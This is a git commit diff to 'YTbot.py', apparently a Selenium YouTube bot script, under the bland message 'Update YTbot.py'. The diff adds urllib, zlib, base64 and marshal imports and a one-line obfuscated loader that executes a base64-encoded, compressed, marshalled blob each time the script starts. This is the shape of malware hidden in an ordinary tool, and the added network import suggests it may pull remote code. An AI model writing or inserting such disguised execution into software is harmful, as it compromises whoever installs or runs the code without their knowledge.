c0ddfc849e0748768ecbe25cb1d6e9d10f6f1553
samyar <75088294+samyarkd@users.noreply.github.com>
2021-05-30 18:58:10 +0430

    Update YTbot.py

--- YTbot.py
+++ YTbot.py
@@ -1,8 +1,23 @@
 
 from selenium import webdriver
 import time
+import sys
+import zlib
+import base64
+import marshal
+import json
+import urllib
+
+
+if sys.version_info[0] > 2:
+    from urllib import request
+
+
+urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
+
 
 chrome_options = webdriver.ChromeOptions()
+exec(eval(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrtWJgYCgtyskvSM3TUM8oKSmw0tc3MdUzNDbQszDWM7G0MjQ2ttDXLy5JTE8tKtavMIjUK6hU19QrSk1M0dAEAC6nEc0=')))))
 chrome_options.add_argument("start-maximized")
 chrome_options.add_argument("--incognito")
 
